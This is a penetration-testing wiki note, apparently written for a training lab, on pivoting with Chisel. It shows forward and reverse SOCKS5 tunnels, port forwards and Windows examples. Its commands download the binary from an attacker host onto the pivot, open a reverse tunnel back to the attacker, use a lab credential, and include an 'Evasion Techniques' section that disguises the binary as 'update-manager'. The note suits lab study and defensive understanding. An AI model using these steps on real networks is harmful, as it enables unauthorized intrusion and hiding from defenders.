# SOCKS5 Tunneling with Chisel

**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
**Related:** [[SSH Socks Tunnel PF|SSH SOCKS Tunnel]], [[Web Server Pivoting with Rpivot|Rpivot]]

---

## Overview

Chisel is a TCP/UDP tunneling tool written in Go that uses HTTP secured with SSH to tunnel traffic. Perfect for firewall-restricted environments where only HTTP/HTTPS is allowed outbound.

**Key Features:**
- HTTP-based tunneling (bypasses strict firewalls)
- SSH-encrypted traffic
- Forward and Reverse SOCKS5 modes
- Single binary (easy deployment)
- Cross-platform (Windows, Linux, macOS)

**Use Cases:**
- Only HTTP/HTTPS allowed outbound
- Traditional SSH blocked by firewall
- Need encrypted tunnel without SSH
- Web application server as pivot

---

## Installation

### Download Pre-compiled Binary
```bash
# On attack machine
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
gunzip chisel_1.7.6_linux_amd64.gz
chmod +x chisel_1.7.6_linux_amd64

# Windows version for Windows pivot
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
gunzip chisel_1.7.6_windows_amd64.gz
```

### Transfer to Pivot Host
```bash
# Via SCP
scp chisel_1.7.6_linux_amd64 ubuntu@10.129.202.64:~/

# Via HTTP (if web access available)
python3 -m http.server 8080
# On pivot: wget http://10.10.14.18:8080/chisel_1.7.6_linux_amd64
```

---

## Forward SOCKS5 Tunneling

**Use When:** You can reach pivot host from outside (inbound allowed)

### Network Flow
```
Attack Machine → Chisel Client → [HTTP/SSH] → Chisel Server (Pivot) → Internal Network
```

### Step 1: Start Chisel Server on Pivot
```bash
./chisel_1.7.6_linux_amd64 server -v -p 1234 --socks5
```

**Output:**
```
server: Listening on http://0.0.0.0:1234
server: SOCKS5 proxy enabled
```

### Step 2: Start Chisel Client on Attack Machine
```bash
./chisel_1.7.6_linux_amd64 client -v 10.129.202.64:1234 socks
```

**Output:**
```
client: Connected (Latency 45ms)
client: Listening socks proxy on 127.0.0.1:1080
```

### Step 3: Configure Proxychains
```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080
```

### Step 4: Access Internal Network
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
proxychains nmap -sT -Pn 172.16.5.19
```

---

## Reverse SOCKS5 Tunneling

**Use When:** Inbound to pivot blocked, only outbound allowed

### Network Flow
```
Chisel Server (Attack) ← [HTTP/SSH] ← Chisel Client (Pivot) → Internal Network
```

### Step 1: Start Chisel Server in Reverse Mode (Attack)
```bash
sudo ./chisel_1.7.6_linux_amd64 server --reverse -v -p 1234 --socks5
```

### Step 2: Start Chisel Client on Pivot (Connect Back)
```bash
./chisel_1.7.6_linux_amd64 client -v 10.10.14.17:1234 R:socks
```

### Step 3: Configure Proxychains (Attack Machine)
```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080
```

### Step 4: Access Internal Network
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Windows Pivot Example

### Windows Pivot
```powershell
# Download
Invoke-WebRequest -Uri "http://10.10.14.18:8080/chisel.exe" -OutFile "C:\chisel.exe"

# Reverse client
.\chisel.exe client -v 10.10.14.17:1234 R:socks
```

### Attack Machine
```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
proxychains nmap -sT -Pn 172.16.5.0/24
```

---

## Advanced Usage

### Port Forwarding (Non-SOCKS)
```bash
# Server on pivot
./chisel server -v -p 1234

# Client - forward local 3389 to internal RDP
./chisel client 10.129.202.64:1234 3389:172.16.5.19:3389

# Access: xfreerdp /v:localhost:3389
```

### Multiple Tunnels
```bash
./chisel client 10.129.202.64:1234 \
  3389:172.16.5.19:3389 \
  445:172.16.5.20:445 \
  socks
```

### Authentication
```bash
# Server
./chisel server -v -p 1234 --auth user:pass --socks5

# Client
./chisel client --auth user:pass 10.129.202.64:1234 socks
```

### HTTPS Mode
```bash
# Server with TLS
./chisel server -v -p 443 --tls-key key.pem --tls-cert cert.pem --socks5

# Client (automatic HTTPS on 443)
./chisel client https://10.129.202.64:443 socks
```

---

## Comparison with Alternatives

| Feature | Chisel | [[SSH Socks Tunnel PF\|SSH]] | [[Web Server Pivoting with Rpivot\|Rpivot]] |
|---------|--------|-----|--------|
| Protocol | HTTP/SSH | SSH | HTTP |
| Encryption | Yes | Yes | Partial |
| Reverse Mode | Yes | Yes | Yes |
| Firewall Bypass | Excellent | Medium | Excellent |
| Ease of Use | Easy | Easy | Medium |
| Platform Support | All | Unix/Win | Python |

**Use Chisel When:**
- SSH is blocked but HTTP allowed
- Need reverse tunnel through firewall
- Want simple deployment (single binary)
- Cross-platform compatibility needed

**Use SSH When:**
- SSH access available
- Want native OS tools only
- Higher performance needed

**Use Rpivot When:**
- Python environment available
- Web server pivot scenario
- HTTP-only egress

---

## Operational Security

### Detection Indicators
- WebSocket connections to unusual ports
- HTTP traffic with SSH-like patterns
- Long-lived HTTP connections
- Chisel binary on disk
- Unusual process names

### Evasion Techniques
```bash
# Use HTTPS on common port
./chisel server -p 443 --tls-cert cert.pem --tls-key key.pem --socks5

# Rename binary
mv chisel update-manager
./update-manager server --socks5

# Use authentication
./chisel server --auth admin:$(openssl rand -base64 32) --socks5
```

---

## Troubleshooting

### Connection Issues
```bash
# Check server listening
netstat -tulpn | grep 1234

# Test connectivity
nc -zv 10.129.202.64 1234

# Firewall check
sudo iptables -L -n
```

### SOCKS Not Working
```bash
# Verify proxy listening
netstat -tulpn | grep 1080

# Test with curl
curl --socks5 127.0.0.1:1080 http://172.16.5.19

# Debug proxychains
proxychains4 -f /etc/proxychains.conf curl http://172.16.5.19
```

### Performance Issues
```bash
# Enable compression
./chisel client --compression 10.129.202.64:1234 socks

# Increase verbosity
./chisel client -v -v 10.129.202.64:1234 socks
```

---

## Quick Reference

```bash
# Forward SOCKS5
# Server (pivot): 
./chisel server -p 1234 --socks5
# Client (attacker): 
./chisel client pivot_ip:1234 socks

# Reverse SOCKS5
# Server (attacker): 
./chisel server --reverse -p 1234 --socks5
# Client (pivot): 
./chisel client attacker_ip:1234 R:socks

# Port forward
./chisel client pivot:1234 local_port:target_ip:target_port

# With auth
./chisel server --auth user:pass --socks5
./chisel client --auth user:pass pivot:1234 socks

# HTTPS
./chisel server -p 443 --tls-cert cert.pem --tls-key key.pem --socks5
./chisel client https://pivot:443 socks
```

---

**See Also:**
- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
- [[SSH Socks Tunnel PF|SSH Dynamic SOCKS Tunnel]]
- [[Web Server Pivoting with Rpivot|Rpivot HTTP Tunneling]]
- [[Remote-Reverse Port Forwarding with SSH|SSH Reverse Forwarding]]

**Tags:** #chisel #socks5 #http-tunnel #pivoting #reverse-tunnel #firewall-bypass